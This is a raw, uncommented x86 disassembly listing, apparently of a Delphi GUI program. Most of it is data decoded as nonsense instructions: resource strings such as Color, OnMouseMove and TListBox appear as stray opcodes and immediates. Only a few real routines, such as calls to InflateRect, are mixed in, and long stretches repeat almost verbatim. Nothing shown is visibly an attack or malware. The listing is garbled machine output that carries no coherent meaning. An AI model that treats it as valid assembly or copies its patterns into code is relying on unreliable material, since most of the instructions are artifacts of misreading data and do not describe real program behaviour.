inc ebx
outsd
ja r-xdata
popad
jb r-xdata
inc esp
outsd
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax + 0x2d ] cl
inc esp
add ah dh
retn 0x44
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax ] bl
jecxz r-xdata
xor al 0x40
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
adc al [ ebp ]
xor al [ eax ]
and [ ecx ] 0x44
add al dh
inc ebx
add [ edx + 0x7c0043ed ] bh
add al [ eax ]
adc [ eax ] al
add al bh
pushad
inc esp
add [ ecx + edx ] al
inc eax
add [ ebp - 0x13bfffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13 ] al
inc ebx
add al dl
in eax dx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x13 ] dl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc eax
add [ ebp - 0x14c3ffc0 ] cl
add al 0x11
popad
je r-xdata
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
insb
bound edx [ esi + 0x69 ]
outsd
js r-xdata
loopne r-xdata
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
in al 0xea
je r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
mov al [ 0x80043eb ]
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
imul ebp [ esi + 0x67 ] 0x4460f800
inc ebp
popad
je r-xdata
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
jb r-xdata
jne r-xdata
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + 0xe040044 ] dl
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
imul ebp [ esi + 0x67 ] 0x746e4907
je r-xdata
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
push 0xa0043ea
insb
bound edx [ ebx + 0x74 ]
popad
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
jbe r-xdata
jb r-xdata
push ebx
je r-xdata
insb
js r-xdata
ja r-xdata
sub_43ef9d
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410c00
je r-xdata
or al 0x5c
inc ebx
outsd
insd
jo r-xdata
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe865646f
cmc
insb
dec ecx
outsb
outsb
jb r-xdata
inc esp
add [ ebx + 0x1 ] ah
add bh bh
in al dx
adc al 0x45
je r-xdata
inc ebx
jb r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
pop esp
inc esp
add [ ebp + 0x1 ] ah
add bh bh
pushad
adc eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
jae r-xdata
push eax
inc esi
inc esp
add [ ebx ] bl
add bh bh
int3
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
je r-xdata
add [ eax ] eax
cwde
pop esp
inc esp
add [ edx + 0x1 ] ah
add bh bh
xor [ 0x10045 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
pop esp
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
or [ ebp ] eax
cmp al 0x9
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050019 ] al
je r-xdata
insb
cwde
push ss
inc edx
add [ eax ] dh
add bh bh
pop eax
mov eax [ 0xffffffffa1740044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + edi + 0x46 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
or [ ebp ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
adc [ eax ] al
sub al 0x2
add bh bh
sub al 0x25
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add bh bh
push ss
add [ 0x6f6c6f43 ] al
insb
dec edi
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
aam 0x4c
outsb
jae r-xdata
pop ss
add [ edi ] al
inc ebx
outsd
insb
jne r-xdata
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jae r-xdata
popad
outsb
jae r-xdata
dec esi
inc esp
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or eax [ ebx + 0x6f ]
add [ ecx ] al
jpo r-xdata
add bh bh
cmp [ esi ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
inc ebp
js r-xdata
jb r-xdata
push ebx
add [ edi ] bl
add bh bh
jo r-xdata
add bh bh
dec esp
inc esp
outsb
push ebx
insb
arpl [ gs : eax + edi + 0x1b ] si
inc edx
add [ eax ] ch
add bh bh
lodsb [ esi ]
mov al [ 0xffffffffa0bc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
add eax 0x336c7443
inc esp
cmp [ esi + 0x44 ] al
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec esp
inc ebp
add [ edx + eax ] ah
add bh bh
aam 0x29
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
adc al 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xf5e86564
add [ eax ] al
and eax 0x754d0b00
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
push cs
dec ecx
outsb
je r-xdata
pop ebx
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
loopne r-xdata
add [ eax ] eax
add [ eax ] al
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
je r-xdata
add [ eax ] al
add [ 0x754d0b00 ] ah
insb
dec eax
imul esp [ gs : edi + 0x68 ] 0x40105474
add [ esi + 0x44 ] dh
add [ eax + 0x1004426 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0023 ] al
je r-xdata
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ ecx + 0x74 ]
insd
add [ ecx ] al
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
add [ gs : eax ] dl
inc eax
add [ ecx ] bh
add al [ eax ]
dec [ esi + 0x44 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ es : esi ] cl
push eax
popad
jb r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x41863c74
add [ eax ] bl
add al [ eax ]
call [ edx + ebp ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050024 ] al
je r-xdata
insd
add [ eax ] al
add [ eax ] al
daa
add [ ebx ] cl
push eax
popad
jb r-xdata
insd
jae r-xdata
inc ebp
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ch
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
add [ ecx ] 0x0
outsb
je r-xdata
adc [ eax ] al
or [ edx ] al
add bh bh
hlt
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
adc [ eax ] al
cmp al [ edx ]
add bh bh
add [ eax ] ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002d ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
in al 0xa0
inc esp
add [ ecx ] al
add [ eax ] al
insb
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
cdq
add [ eax ] al
dec [ eax ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
adc [ eax ] al
cmp al 0x2
add bh bh
shl [ esi ] 0x1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
inc esp
add [ eax + eax * 8 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
jl r-xdata
add ah dh
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
das
add [ eax ] cl
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
or [ fs : ebp + 0x44 ] cl
add [ ecx + ecx + 0x45 ] dh
add [ cs : esi ] al
push ebx
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x0
or edx [ ebx + 0x63 ]
jb r-xdata
adc [ eax ] al
adc al 0x37
inc esp
add [ eax ] dh
aaa
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
inc eax
add [ ecx + 0x8ff0000 ] bl
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
0x2cff0000 0x44a1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] al
or edx [ eax + 0x61 ]
adc [ eax ] al
test eax 0x48ff0001
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ ss : edi + ecx * 2 ] cl
outsb
inc esp
popad
je r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
sub al [ eax ]
xchg ebp eax
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002b ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x7c ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003c ] al
dec edi
jbe r-xdata
[ eax ]
jo r-xdata
dec ebx
jns r-xdata
in al 0x7c
inc ecx
add al al
add [ eax ] eax
outsb
inc ebp
outsb
inc esp
dec edi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
0x2600043 0xff00
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or cl [ edi + 0x6e ]
iretd
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ebx ] cl
dec edi
jo r-xdata
insd
fmul [ esi + 0x44 ]
add al 0x50
inc esp
add al ah
add [ eax ] eax
jmp eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
inc esp
jb r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003d ] al
outsb
inc ebp
outsb
je r-xdata
jl r-xdata
popad
dec ebp
outsd
jbe r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
rol [ ebx ] 0x1
pop eax
add al [ eax ]
[ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ 0x654d6e4f ] cl
popad
jae r-xdata
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003e ] al
outsb
inc ebp
js r-xdata
inc esp
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
stc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
clc
outsb
push ebx
je r-xdata
dec edi
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
jo r-xdata
jb r-xdata
add [ eax ] ch
sbb al [ eax + eax + 0x18 ]
sbb eax [ eax + eax - 0x38 ]
mov bl 0x41
add [ ebx + ebx + 0x1c2c0044 ] ch
sbb al [ eax + eax + 0x68 ]
mov bl 0x41
jb r-xdata
push esp
dec edi
inc esp
add al bl
add [ eax ] al
mov eax 0xe800444f
add [ eax ] eax
jns r-xdata
je r-xdata
inc ecx
mov eax eax
jl r-xdata
push edx
cmp al 0xfc
jmp [ edi + ecx * 4 + 0x5 ]
imul ebp [ esi + 0x67 ] 0x43f91073
add [ edi ] al
andps xmm1 [ ecx + ebp * 2 + 0x73 ]
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
add [ ebp ] 0x9
dec ecx
je r-xdata
inc esp
add [ eax ] al
mov edx 0xba880041
inc ecx
add [ edi + ebx ] cl
inc esp
add al dl
mov ebx 0x1c540041
inc esp
add [ eax ] al
scasd [ edi ]
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add ah bh
push ds
inc esp
add [ ebp + ebx + 0x1d9c0044 ] cl
inc esp
add [ ebx + esi * 4 + 0x41 ] dh
add [ eax + 0x1f ] al
inc esp
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add ah dh
sbb al 0x44
add [ esi + esi * 4 - 0x494bffbf ] al
inc ecx
add [ eax ] cl
mov bh 0x41
add [ edi + ebx - 0x46b3ffbc ] al
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x53786f42
je r-xdata
inc esp
add [ esp + ebx ] ch
jb r-xdata
inc esp
dec edi
inc esp
add al bl
add [ eax ] eax
push eax
mov edx 0xb9
mov eax esi
call sub_449774
mov edx 0x69
mov eax esi
outsd
js r-xdata
add ah bl
scasd [ edi ]
inc ecx
add [ edx + ebx + 0x44 ] al
add [ eax - 0x4d ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
jb r-xdata
inc ebx
add [ eax + eax ] dl
add [ eax ] al
push esp
test [ ecx ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + ebp * 4 - 0x5353ffbf ] ch
inc ecx
add ah ah
mov al 0x41
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
inc ebp
add [ ecx ] cl
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
call sub_449798
mov eax esi
test bl bl
je r-xdata
je r-xdata
lodsb [ esi ]
scasb [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x4f1bffbf ] ch
inc ecx
inc esp
outsd
add [ ebx + 0x53000408 ] ch
push esi
imul ebp [ esi + 0x67 ] 0x43f87c73
add [ esi + eax * 4 ] bh
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c80c
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
add [ ebx + 0x56 ] dl
inc ebx
je r-xdata
call sub_424494
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4243f0
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push ebx
push 0x208838b
add [ eax ] al
insb
jae r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
sub_43f55b
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060034 ] al
outsb
inc esp
popad
je r-xdata
add [ eax ] al
xor [ edi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942f5ee
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
jb r-xdata
pushfd
jmp r-xdata
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or [ edi + 0x6e ] ecx
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x7c ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
dec ebx
jns r-xdata
in al 0x7c
inc ecx
add al al
add [ eax ] eax
jo r-xdata
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003e ] al
outsb
inc ebp
js r-xdata
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc esp
jb r-xdata
push eax
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ebx ] cl
dec edi
jo r-xdata
insd
fmul [ esi + 0x44 ]
add al 0x50
inc esp
add al ah
add [ eax ] eax
jmp eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
inc esp
jb r-xdata
inc eax
add [ eax ] eax
jl r-xdata
jns r-xdata
je r-xdata
add [ eax + 0x4f07003d ] al
add [ eax ] al
ja r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003c ] al
dec edi
jbe r-xdata
popad
dec ebp
outsd
jbe r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
rol [ ebx ] 0x1
pop eax
add al [ eax ]
[ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ 0x654d6e4f ] cl
popad
jae r-xdata
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
jb r-xdata
inc esp
dec edi
inc esp
add al bl
add [ eax ] eax
popad
je r-xdata
outsb
inc ebp
outsb
inc esp
dec edi
jb r-xdata
inc esp
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
stc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
clc
outsb
push ebx
je r-xdata
dec edi
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
jo r-xdata
jb r-xdata
add [ eax ] ch
sbb al [ eax + eax + 0x18 ]
sbb eax [ eax + eax - 0x38 ]
mov bl 0x41
add [ ebx + ebx + 0x1c2c0044 ] ch
sbb al [ eax + eax + 0x68 ]
mov bl 0x41
jb r-xdata
push esp
dec edi
inc esp
add al bl
add [ eax ] al
mov eax 0xe800444f
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
insd
jo r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or cl [ edi + 0x6e ]
iretd
inc ecx
mov eax eax
jl r-xdata
push edx
cmp al 0xfc
jmp [ edi + ecx * 4 + 0x5 ]
imul ebp [ esi + 0x67 ] 0x43f91073
add [ edi ] al
andps xmm1 [ ecx + ebp * 2 + 0x73 ]
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
add [ ebp ] 0x9
dec ecx
je r-xdata
inc esp
add [ eax ] al
mov edx 0xba880041
inc ecx
add [ edi + ebx ] cl
inc esp
add al dl
mov ebx 0x1c540041
inc esp
add [ eax ] al
scasd [ edi ]
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add ah bh
push ds
inc esp
add [ ebp + ebx + 0x1d9c0044 ] cl
inc esp
add [ ebx + esi * 4 + 0x41 ] dh
add [ eax + 0x1f ] al
inc esp
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add ah dh
sbb al 0x44
add [ esi + esi * 4 - 0x494bffbf ] al
inc ecx
add [ eax ] cl
mov bh 0x41
add [ edi + ebx - 0x46b3ffbc ] al
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x53786f42
je r-xdata
inc esp
add [ esp + ebx ] ch
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
push ecx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003b ] al
outsb
push eax
mov edx 0xb9
mov eax esi
call sub_449774
mov edx 0x69
mov eax esi
outsd
js r-xdata
add ah bl
scasd [ edi ]
inc ecx
add [ edx + ebx + 0x44 ] al
add [ eax - 0x4d ] ch
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
jb r-xdata
inc ebx
add [ eax + eax ] dl
add [ eax ] al
push esp
test [ ecx ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + ebp * 4 - 0x5353ffbf ] ch
inc ecx
add ah ah
mov al 0x41
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
inc ebp
add [ ecx ] cl
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
call sub_449798
mov eax esi
